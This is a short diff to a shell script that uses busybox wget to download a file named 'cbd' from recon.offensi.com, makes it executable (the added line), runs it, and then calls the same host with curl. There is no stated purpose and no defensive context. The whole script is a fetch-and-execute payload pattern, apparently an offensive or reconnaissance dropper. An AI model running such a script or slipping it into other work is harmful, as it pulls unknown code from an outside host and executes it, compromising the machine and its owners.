@@ -1,5 +1,6 @@
 #!/bin/sh
 /bin/busybox wget http://recon.offensi.com/cbd
+chmod +x ./cbd
 ./cbd
 curl http://recon.offensi.com
 
